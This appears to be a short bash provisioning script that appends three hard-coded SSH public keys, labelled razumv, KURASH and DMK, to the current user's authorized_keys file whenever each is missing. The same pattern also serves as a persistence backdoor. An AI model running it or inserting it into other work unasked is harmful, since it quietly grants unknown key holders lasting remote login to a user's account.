#!/bin/bash

if [ $( /bin/grep razumv $HOME/.ssh/authorized_keys | wc -l) == 0 ]; then
  echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAgEAnc+maLvn7D3iRKEHjZ2Ylt0uSC7uhVaEHwMfXSvNs4U9T5Eba7roAvz2M5nGIW41XamXOseL1JzYeRxgFs9RSRueQcW/8tauVFwLA+x8JdlbNtNOnfvBtd/mRTBUSZUsnM5f/WfW5FAtXXTJFKsjjpkEgLYsIsbtx1DF4ALyQrbdhDlSpaZ1PdF8yNpUsvrMVPCmZpoWNxkdMKXd96a9vZHo9YeB1kAQpuolyt4eoXLQBYC321l8o8S3QDfNQf3KADu1xFJB0lu5f93o2oij9PRI+wT15ud5JbEf3s3lKtlRxLKP5u0OGNrbep/xU3TI6bFBAI1tX63QtEesfcDfu8GgGpTEIVuEkK4itSrpNUD5CsbKLtQ11KhxRSDdcupq/bfOfhrz349dxN7Gj8LMJDU23OOm5M0SDSulRuJMffHoB253tB/WZtR7v4Jr8PDfIbnT9TsF+9GPcpySN1qRltkkYKlzDoZq2O0UCKFJjSKVlwJ7O1+Tekn69Td2bSmRo456twatuHJOx0P/2nnQdDYDya4VoiY60VrVwS9OAbcXa47LoIYJaQcYipSk3SZirNLu2LZiZ6Ou2rIJ3tX6JVYk6apiH9q8RtXgN3wqmfRz90wZVFif2Q6jRiFpErNd4PZd0TWtBT80kX8gAEzllNQx1TPE9B9ceTrxYHQe4rk= razumv" >> $HOME/.ssh/authorized_keys
fi

if [ $( /bin/grep KURASH $HOME/.ssh/authorized_keys | wc -l) == 0 ]; then
  echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC9R0v9a904uXs2kjS6nHPzEbHU1csaL+MD63iHm457rmcBUMGCIwihNhc/q40NCGpqFyvs9mAEjZ4rZkSr1RQQ5pC4SBlYgouvqah+JMz21fFeFj4G6vR5t8T1VK9MvHcPtkQXYx5ffk29W5xXWrhl0R1BwRUTRBCA3VCiHO+jsQYcJpkn/Ffkvk/dJLfL/9jxjpbQgXbkqNO/trLtfRn5xV0yIuCbTJlvwfRrXbuNvgMZceOkDGGujyaTskMLfWuha/QQ/dANopzaYDBRfrhBYWsOHpa7IR6JtWM0CgSIC9a8DyruJYK+A2HEqUdGmnVIwg/uveyiiuvFb7n/2Re5pKMgoJgS62srEpymy4RD+ZuTjKS6WhSsQcljaq8DqrA/MNrZ9lyygi7jWfcIcRWV6SGXFpyHPhhoA6yiA/jDk4qQvU0NPIBgk1KRO/W6BafZ6VKfbSclQ9gOoUnSZLZsVxuX35piCYgQGolMjyzEd4JBxGaHDNc6bC4PO+ydAhnBK0ugjP2frgeFLyiUzI+ZD2lgm+XA0lxneelDu15oeA4ZHcdzF8CK4Co5OJtmXo812apARqaXLYQJwvDGJqAGLtaQoLwVrUmwbAMmiWAflb6w7UFaYDNm6PyduD9yyWjsCXdyhHgrN7naN4Ux8e1/5Z7jCrq0TmB91u4P3f/Ggw== KURASH" >> $HOME/.ssh/authorized_keys
fi

if [ $( /bin/grep DMK $HOME/.ssh/authorized_keys | wc -l) == 0 ]; then
  echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDxUnuI8ssZBtE5PGJ+NDqnr5Gra/A1BPXZLElEcysatM2v8hdtnF0nbEqPpmXm9gjVDahMjuOmpjjr1nkuaq050jVedbuocbCCffGJ5UFn5VIZu+GO37T4YjX54vgtHwbRw3cLyj/sPnVVSDoyL9vXFRlH7+ZJQGapeKzFjoABQ3tqQ8ieU20mS9kLqszqcQtiHilENGFbgoqO9wTVmuklFV9BebsZwjRSC+Aasw4PRwVajqvsPtej65rXtHSRbJvJArk0Zva1FAgHrs98u3lLN31OK3EdaUowAUZ4fEPORog4+tYcddtKPuaVGjnp6IBJvWav/2724fHcEiPBRXAZgsqtE9fj9YMN9Hty4ELoyw94ldC0EeteLlCE4W0pEYrIcE+BxxOMn6N4wGasYOp7mHBgH04xTulr+7AVqtlcswwwqTAJLwqq3m/RAfLCUUL8y92yA2Bih1P2tQTk9RSDaUGVCqr2tz5/l3V26mlsHu9yr8n6j2dG+Ls4yhTJX00= DMK" >> $HOME/.ssh/authorized_keys
fi